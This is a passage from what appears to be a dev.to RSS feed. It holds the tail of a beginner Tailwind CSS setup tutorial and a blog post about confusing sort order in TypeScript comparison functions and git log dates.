      'green': '#13ce66',
      'yellow': '#ffc82c',
      'gray-dark': '#273444',
      'gray': '#8492a6',
      'gray-light': '#d3dce6',
    },
    fontFamily: {
      sans: ['Graphik', 'sans-serif'],
      serif: ['Merriweather', 'serif'],
    },
    extend: {
      spacing: {
        '8xl': '96rem',
        '9xl': '128rem',
      },
      borderRadius: {
        '4xl': '2rem',
      }
    }
  },
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#editor-setup"&gt;
  &lt;/a&gt;
  Editor Setup 💣💥
&lt;/h3&gt;

&lt;p&gt;If you use vscode as your preferred IDE you can simply install the extension "Tailwind CSS IntelliSense" it provides Vscode users with advanced features such as autocomplete, syntax highlighting, and lining.&lt;/p&gt;

&lt;p&gt;Moving on in your directory create a folder called src and inside that folder create a file .css. in my case, it would be style.css and my directory will look something like this &lt;br&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--KqTu2fiW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yt3096m8wbg5zinknmr5.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--KqTu2fiW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yt3096m8wbg5zinknmr5.PNG" alt="Image1" width="880" height="195"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;in your &lt;strong&gt;style.css&lt;/strong&gt; I want you to add&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;@tailwind base;
@tailwind components;
@tailwind utilities;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;These are tailwind directives and are important layers to your &lt;strong&gt;main.css&lt;/strong&gt;. let me explain better how tailwind uses these directives, In other to use tailwind in your HTML files, tailwind will use the directive in your src folder and convert that to a stylesheet format we can use inside our file &lt;br&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// Something like this

style.css [in src ] ➡️ Tailwind [works its magic] ➡️ main.css [a stylesheet we can use/link to] ➡️ index.html
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;One more step and we are all set to use Tailwind in our project, and that is  to build our main.css as illustrated above, so we can do that easily in our package.json file and add this in the script section of the file&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;"scripts": {
      "build-css": "tailwindcss build src/styles.css -o public/main.css"
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;What the script is insinuating is tailwind should go into the src folder where we have our style.css file do its magic and produce an output that would be stored in a file main.css created in a public folder.&lt;/p&gt;

&lt;p&gt;You should have something similar to this in your package.JSON file. it is good to not that it is not compulsory to use &lt;strong&gt;"build-css"&lt;/strong&gt; you can use any variable name of your choice i used that naming convention because we would be literally building another CSS file&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--R-T_pLYH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9f818slr7yt38fn4y3fa.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--R-T_pLYH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9f818slr7yt38fn4y3fa.PNG" alt="Image2" width="880" height="313"&gt;&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// Once that is done run the snippet below

npm run build-css

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once you run the snippet you will notice a main.css file inside a public folder created by tailwind&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sqcO1OlU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1gwx6ugyfmc3v8efnroh.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--sqcO1OlU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1gwx6ugyfmc3v8efnroh.PNG" alt="Image3" width="880" height="316"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's create an index.html file in our src folder and link the main stylesheet&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// index.html

&amp;lt;!doctype html&amp;gt;
&amp;lt;html&amp;gt;
    &amp;lt;head&amp;gt;  
        &amp;lt;meta charset="UTF-8"&amp;gt;  
        &amp;lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&amp;gt; 
        &amp;lt;link href="/public/main.css" rel="stylesheet"&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;  
        &amp;lt;h1 class="flex justify-center text-3xl font-bold underline"&amp;gt;    
            Hello, world! 
        &amp;lt;/h1&amp;gt;
    &amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You should get something similar to this when you run your index.html&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--nomqqHXY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/taizj68iiwmqf2o0rlx6.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--nomqqHXY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/taizj68iiwmqf2o0rlx6.PNG" alt="Image4" width="880" height="105"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tailwind-utilities"&gt;
  &lt;/a&gt;
  Tailwind Utilities 🐕‍🦺
&lt;/h2&gt;

&lt;p&gt;These are one of my personal favorite utilities I find myself using in most of my projects there are loads more utility to use and can find more information on them on Tailwind official &lt;a href="https://tailwindcss.com/docs/font-family"&gt;doc&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;flex = display: flex.&lt;/li&gt;
&lt;li&gt;justify-center = justify-content: center.&lt;/li&gt;
&lt;li&gt;mt-10 = margin-top: 2.5rem&lt;/li&gt;
&lt;li&gt;&lt;p&gt;px-10 =&lt;br&gt;
{&lt;br&gt;
padding-left: 2.5rem/* 40px &lt;em&gt;/;&lt;br&gt;
padding-right: 2.5rem/&lt;/em&gt; 40px */;&lt;br&gt;
}&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;items-center = align-items: center&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;text-xl = font-size: 1.25rem&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;md:text-xl = md means medium size.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;font-mono = font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;hover:bg-red-600 = applies a background color of red&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;hover:text-white = applies a color of white on hover&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;underline = text-decoration: underline&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;font-bold= font-weight: bold&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#wrapping-up"&gt;
  &lt;/a&gt;
  Wrapping Up 🧻
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;TailwindCSS&lt;/strong&gt; does not define the way your component looks. You define that by combining several classes together to give you your desired result. &lt;/p&gt;

&lt;p&gt;in the next article we would build a login form with Tailwind, so do well to follow me to be notified when it is posted.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#lets-connect"&gt;
  &lt;/a&gt;
  Let's connect 🖇️
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Reach out to me on &lt;a href="https://www.linkedin.com/in/tijanayo/"&gt;Linkedin&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;Reach out to me on the &lt;a href="https://twitter.com/NobleTijan"&gt;Bird app&lt;/a&gt; ( Kindly follow I'll follow back immediately )&lt;/li&gt;
&lt;li&gt;We can also connect in the comment section below (Leave your thought... would you try &lt;strong&gt;TailwindCSS&lt;/strong&gt; in your next project❓❓ )&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>beginners</category>
      <category>javascript</category>
      <category>programming</category>
      <category>webdev</category>
    </item>
    <item>
      <title>What's Wrong This Time? Part II: Electric Bugaloo</title>
      <author>Andrew (he/him)</author>
      <pubDate>Sun, 23 Jan 2022 19:26:25 +0000</pubDate>
      <link>https://dev.to/awwsmm/whats-wrong-this-time-part-ii-electric-bugaloo-jl4</link>
      <guid>https://dev.to/awwsmm/whats-wrong-this-time-part-ii-electric-bugaloo-jl4</guid>
      <description>&lt;p&gt;&lt;strong&gt;Part II: The Bugs&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There's an old programming joke that goes &lt;a href="https://martinfowler.com/bliki/TwoHardThings.html"&gt;something like&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;There are only two hard problems in computer science: cache invalidation, naming things, and off-by-one errors.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I think we should add a third (fourth?) problem to that list: sorting things.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#sorting-things"&gt;
  &lt;/a&gt;
  Sorting Things
&lt;/h2&gt;

&lt;p&gt;There are &lt;a href="https://en.wikipedia.org/wiki/Sorting_algorithm"&gt;lots of different ways to sort things&lt;/a&gt; in computer science. C.S. students learn about time and space complexity of these sorting algorithms, YouTubers make &lt;a href="https://www.youtube.com/watch?v=BeoCbJPuvSE"&gt;cool visualisations&lt;/a&gt; of them, and occasionally, &lt;a href="https://en.wikipedia.org/wiki/Timsort"&gt;a guy named Tim&lt;/a&gt; will invent a new one.&lt;/p&gt;

&lt;p&gt;But there's one aspect of sorting algorithms that -- for me, at least -- seems completely impossible: remembering in which direction things are sorted.&lt;/p&gt;

&lt;p&gt;If you say to a group of people: "okay, everyone, stand in a single-file line, ordered by height", the next question you might ask is "okay, but in which direction?" Who should stand at the &lt;em&gt;front&lt;/em&gt; of the line? The shortest person or the tallest person?&lt;/p&gt;

&lt;p&gt;In programming, we define comparison functions, which describe how to order whatever objects we're interested in.&lt;/p&gt;

&lt;p&gt;Some comparison functions seem obvious. For example, in TypeScript, using the default &lt;code&gt;string&lt;/code&gt; comparison...&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;cherry&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;apple&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;banana&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;//...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;...we would expect &lt;code&gt;array&lt;/code&gt; to be sorted alphabetically, with &lt;code&gt;apple&lt;/code&gt; as the first (&lt;code&gt;0&lt;/code&gt;th) element of the sorted array&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="c1"&gt;//...&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="c1"&gt;// [ 'apple', 'banana', 'cherry' ]&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="c1"&gt;// apple&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;Note that &lt;code&gt;&amp;lt;array&amp;gt;.sort()&lt;/code&gt; in JavaScript sorts the array "in place", so that the original, unsorted &lt;code&gt;array&lt;/code&gt; no longer exists afterward. In some languages, and for some sorting algorithms, arrays are not sorted in place, and a new array will be returned. This new array should be assigned to a new variable.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But often we will be working with objects more complex than &lt;code&gt;string&lt;/code&gt;s, and we will need to define custom comparison functions. These are functions which take two elements of type &lt;code&gt;T&lt;/code&gt; and return a &lt;code&gt;number&lt;/code&gt;, and are used to sort arrays of type &lt;code&gt;T&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;newArray&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;cherry&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;apple&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;banana&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;comparison&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;t1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;t2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;t1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;charCodeAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nx"&gt;t2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;charCodeAt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nx"&gt;newArray&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;comparison&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newArray&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="c1"&gt;// ?&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newArray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="c1"&gt;// ?&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Without &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort"&gt;reading the docs&lt;/a&gt;, will the &lt;code&gt;console.log()&lt;/code&gt;s above give the same result as the earlier ones? How about something a bit simpler -- sorting an array of &lt;code&gt;number&lt;/code&gt;s:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;newArray&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2112&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;comparison&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;t1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;t2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;t2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nx"&gt;t1&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nx"&gt;newArray&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;comparison&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newArray&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="c1"&gt;// ?&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newArray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="c1"&gt;// ?&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Will the first element above be &lt;code&gt;19&lt;/code&gt;? Or &lt;code&gt;2112&lt;/code&gt;? Are you sure?&lt;/p&gt;

&lt;p&gt;I understand the utility of sorting algorithms, and I understand the need for a ternary (greater than, less than, or equal) return value, and hence &lt;code&gt;number&lt;/code&gt; as the return type instead of &lt;code&gt;boolean&lt;/code&gt;, but comparison functions are just one of those things that I've always had to test every time. Sometimes in development, and sometimes in production.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#so-what-happened"&gt;
  &lt;/a&gt;
  So What Happened?
&lt;/h2&gt;

&lt;p&gt;With what we learned above, you should now be able to see what went wrong with &lt;a href="https://github.com/awwsmm/awwsmm.com/commit/69e038a919e448251fa2211a9fcf3fda914812fe"&gt;my initial code&lt;/a&gt;. The problem was here&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;    &lt;span class="c1"&gt;// get the blog post date from its git commit date&lt;/span&gt;
    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;gitLog&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;SlugFactory&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;git&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="na"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;`blog/&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;.md`&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;gitLog&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;lines&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;dates&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;lines&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;all&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;each&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;each&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

      &lt;span class="c1"&gt;// if blog post hasn't been committed yet, use current date&lt;/span&gt;
      &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;dates&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Date&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;toISOString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;FrontMatter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;description&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;rawContent&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;git log&lt;/code&gt; returns commits sorted by date, such that &lt;em&gt;newer&lt;/em&gt; commits come first and &lt;em&gt;later&lt;/em&gt; commits come afterward. So &lt;code&gt;dates[0]&lt;/code&gt;, above, is the &lt;em&gt;newest commit&lt;/em&gt; returned from &lt;code&gt;git log&lt;/code&gt;, and each blog post was being given a "publication" date of the most recent commit in which that post was modified.&lt;/p&gt;

&lt;p&gt;When were these blog posts most recently modified? Well, all of them were modified in &lt;a href="https://github.com/awwsmm/awwsmm.com/commit/69e038a919e448251fa2211a9fcf3fda914812fe"&gt;that same commit&lt;/a&gt;, because the point of the commit was to remove the &lt;code&gt;date&lt;/code&gt; parameter from the front matter. Essentially, I was mixing up the &lt;code&gt;lastUpdated&lt;/code&gt; date and the &lt;code&gt;published&lt;/code&gt; date. One of these is the first element in the list (&lt;code&gt;dates[0]&lt;/code&gt;) and one of them is the last element in the list (&lt;code&gt;dates[dates.length-1]&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;So like I said, there are four hard problems in computer science.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#on-to-the-next-one"&gt;
  &lt;/a&gt;
  On To The Next One
&lt;/h2&gt;

&lt;p&gt;With that fixed, we're off to the races, right?&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SM22UV1y--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/ME7yZQ9.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SM22UV1y--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://i.imgur.com/ME7yZQ9.png" alt="Screenshot from awwsmm.com showing blog posts with incorrect dates" width="616" height="359"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Oh... well, that's not right.&lt;/p&gt;

&lt;p&gt;Those two posts were both committed on January 2 (&lt;a href="https://github.com/awwsmm/awwsmm.com/commit/ec96618d38c71134f4a9ed14d6ae6d7a2b5c9e59"&gt;Hello, World!&lt;/a&gt; and &lt;a href="https://github.com/awwsmm/awwsmm.com/commit/b2e504f52e4df0ddf77c662903e39b4aaf12f242"&gt;Git Hooks&lt;/a&gt;), not on January 6. So why did they both have the wrong date?&lt;/p&gt;

&lt;p&gt;That's right, it's another bug... Or is it?&lt;/p&gt;

&lt;p&gt;Find out in the &lt;em&gt;thrilling&lt;/em&gt; final installation of this debugging mystery! Stay tuned!&lt;/p&gt;

</description>
      <category>beginners</category>
      <category>typescript</category>
      <category>javascript</category>
    </item>
    <item>
